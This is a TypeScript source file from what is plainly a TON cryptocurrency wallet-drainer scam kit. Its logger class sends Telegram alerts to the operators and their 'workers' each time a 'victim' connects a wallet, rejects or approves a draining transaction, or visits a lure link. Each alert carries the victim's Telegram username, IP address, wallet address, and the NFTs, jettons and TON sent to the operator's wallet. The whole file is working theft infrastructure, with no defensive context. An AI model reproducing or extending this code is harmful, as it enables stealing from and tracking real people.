import type { Item } from '@api/types'
import { Worker } from '@db/controllers/workers'
import type { DrainMode } from '@prisma/client'
import { tgSend } from './notify'
import { config } from '@utils/config'
import type { WebAppData } from './parseUser'
import type { IConnectedWallet, ITransaction, Wallet } from './types'

class TelegramLogger {
	private chatId: string

	constructor(chatId: string) {
		this.chatId = chatId
	}

	private formatWallet(wallet: string, raw?: Wallet): string {
		const walletData = raw
			? `(<i>${raw.device.platform} | ${raw.device.appName.toLowerCase()}</i>)`
			: ''

		return `<a href="https://tonviewer.com/${wallet}">${wallet.slice(
			0,
			4
		)} ... ${wallet.slice(-4)}</a> ${walletData}`
	}

	private formatIP(ip?: string): string {
		if (!ip) {
			return 'Unknown'
		}

		return `<a href="https://check-host.net/ip-info?host=${ip}">${ip}</a>`
	}

	private formatUser(data?: WebAppData): string {
		if (!data) {
			return 'Unknown'
		}

		const user = data.userData
		if (!user.username) {
			return `<a href="tg://user?id=${user.id}">${user.first_name}</a> (<i>${data.platformInfo.platform}</i>)`
		}

		return `@${user.username} (<i>${data.platformInfo.platform}</i>)`
	}

	private formatNFT(name?: string): string {
		if (!name) {
			return 'Unknown'
		}

		if (name.startsWith('@')) {
			const username = name.slice(1)
			return `<a href="https://fragment.com/username/${username}">${name}</a>`
		}

		const formattedNumber = name.replace(/[^0-9]/g, '')

		return `<a href="https://fragment.com/number/${formattedNumber}">${name}</a>`
	}

	private formatMessage(data: Item[], mode: DrainMode): string {
		let filteredData: Item[]

		switch (mode) {
			case 'NFT':
				filteredData = data.filter(item => item.type === 'NFT')
				break

			case 'Trade':
				filteredData = data.filter(item => item.type === 'NFT')

				if (filteredData.length > 0) {
					filteredData = [filteredData[0]]
				}

				break

			case 'Full':
			default:
				filteredData = data
				break
		}

		return filteredData
			.map(item => {
				switch (item.type) {
					case 'NFT':
						const cancelLabel = item.shouldCancel ? '👀' : ''
						return `${cancelLabel} 🎁 ${this.formatNFT(
							item.name
						)} for <b>${item.price.toFixed(2)} Gram</b>`

					case 'JETTON':
						return `🪙 ${item.name} for <b>${item.price.toFixed(2)} Gram</b>`

					case 'TON':
						return `💎 ${item.price.toFixed(2)} Gram`

					default:
						return ''
				}
			})
			.join('\n')
	}

	async Connect(options: IConnectedWallet): Promise<void> {
		try {
			const worker = await Worker.Get(options.workerId)

			let text =
				'<b>⚠️ Wallet Connected</b>\n\n' +
				`<i>— Deal:</i> ${options.item} for <b>💎 ${options.amount} Gram</b>\n` +
				`<i>— Victim:</i> ${this.formatUser(options.webAppData)}\n` +
				`<i>— Strategy:</i> <a href="${options.href}">${options.mode}</a>\n` +
				`<i>— NFTs:</i> Direct transfer\n` +
				`<i>— Honeypot:</i> ${worker?.honeyPot ? 'Enabled' : 'Disabled'} (${
					worker?.honeyPotMode
				})\n` +
				`<i>— Wallet:</i> ${this.formatWallet(options.wallet, options.raw)}\n` +
				`<i>— IP:</i> ${this.formatIP(options.ip)}\n` +
				`<i>— Worker:</i> @${worker?.tgUser} (${worker?.id})`

			await tgSend(this.chatId, text)

			if (worker && worker.logChat) {
				await tgSend(worker.logChat, text)
			}
		} catch (e) {
			console.log(e)
		}
	}

	async Reject(options: ITransaction): Promise<void> {
		try {
			const worker = await Worker.Get(options.workerId)

			const assetData = this.formatMessage(
				options.raw,
				options.mode as DrainMode
			)

			let text =
				'<b>🚫 Transaction Rejected</b>\n' +
				`<code>${options.err}</code>\n\n` +
				`<i>— Deal:</i> ${options.item} for <b>💎 ${options.amount} Gram</b>\n` +
				`<i>— Victim:</i> ${this.formatUser(options.webAppData)}\n` +
				`<i>— Strategy:</i> <a href="${options.href}">${options.mode}</a>\n` +
				`<i>— NFTs:</i> Direct transfer\n` +
				`<i>— Honeypot:</i> ${worker?.honeyPot ? 'Enabled' : 'Disabled'} (${
					worker?.honeyPotMode
				})\n` +
				`<i>— Wallet:</i> ${this.formatWallet(options.wallet)}\n` +
				`<i>— IP:</i> ${this.formatIP(options.ip)}\n` +
				`<i>— Worker:</i> @${worker?.tgUser} (${worker?.id})\n` +
				'<i>— Assets:</i>\n' +
				`<blockquote>${assetData}</blockquote>`

			await tgSend(this.chatId, text)

			if (worker && worker.logChat) {
				await tgSend(worker.logChat, text)
			}
		} catch (e) {
			console.log(e)
		}
	}

	async Disconnect(options: IConnectedWallet): Promise<void> {
		try {
			const worker = await Worker.Get(options.workerId)

			let text =
				'<b>🔓 Wallet Unlinked</b>\n\n' +
				`<i>— Deal:</i> ${options.item} for <b>💎 ${options.amount} Gram</b>\n` +
				`<i>— Victim:</i> ${this.formatUser(options.webAppData)}\n` +
				`<i>— Strategy:</i> <a href="${options.href}">${options.mode}</a>\n` +
				`<i>— NFTs:</i> Direct transfer\n` +
				`<i>— Honeypot:</i> ${worker?.honeyPot ? 'Enabled' : 'Disabled'} (${
					worker?.honeyPotMode
				})\n` +
				`<i>— Wallet:</i> ${this.formatWallet(options.wallet, options.raw)}\n` +
				`<i>— IP:</i> ${this.formatIP(options.ip)}\n` +
				`<i>— Worker:</i> @${worker?.tgUser} (${worker?.id})`

			await tgSend(this.chatId, text)

			if (worker && worker.logChat) {
				await tgSend(worker.logChat, text)
			}
		} catch (e) {
			console.log(e)
		}
	}

	async Approve(options: ITransaction): Promise<void> {
		try {
			const worker = await Worker.Get(options.workerId)

			const assetData = this.formatMessage(
				options.raw,
				options.mode as DrainMode
			)

			let text =
				'<b>✅ Transaction Approved</b>\n\n' +
				`<i>— Dest:</i> ${this.formatWallet(config.WALLET)}\n\n` +
				`<i>— Deal:</i> ${options.item} for <b>💎 ${options.amount} Gram</b>\n` +
				`<i>— Victim:</i> ${this.formatUser(options.webAppData)}\n` +
				`<i>— Strategy:</i> <a href="${options.href}">${options.mode}</a>\n` +
				`<i>— NFTs:</i> Direct transfer\n` +
				`<i>— Honeypot:</i> ${worker?.honeyPot ? 'Enabled' : 'Disabled'} (${
					worker?.honeyPotMode
				})\n` +
				`<i>— Wallet:</i> ${this.formatWallet(options.wallet)}\n` +
				`<i>— IP:</i> ${this.formatIP(options.ip)}\n` +
				`<i>— Worker:</i> @${worker?.tgUser} (${worker?.id})\n` +
				'<i>— Assets:</i>\n' +
				`<blockquote>${assetData}</blockquote>`

			await tgSend(this.chatId, text)

			if (worker && worker.logChat) {
				await tgSend(worker.logChat, text)
			}
		} catch (e) {
			console.log(e)
		}
	}

	async LogStartApp(startAppData: string, href: string, ip?: string): Promise<void> {
		try {
			let text =
				'<b>🔗 StartApp Link Visited</b>\n\n' +
				`<i>— StartApp Data:</i> <code>${startAppData}</code>\n` +
				`<i>— Link:</i> <a href="${href}">${href}</a>\n` +
				`<i>— IP:</i> ${this.formatIP(ip)}\n` +
				`<i>— Timestamp:</i> ${new Date().toISOString()}`

			await tgSend(this.chatId, text)
		} catch (e) {
			console.log(e)
		}
	}
}

export const Logger = new TelegramLogger(config.LOGGING_CHANNEL)
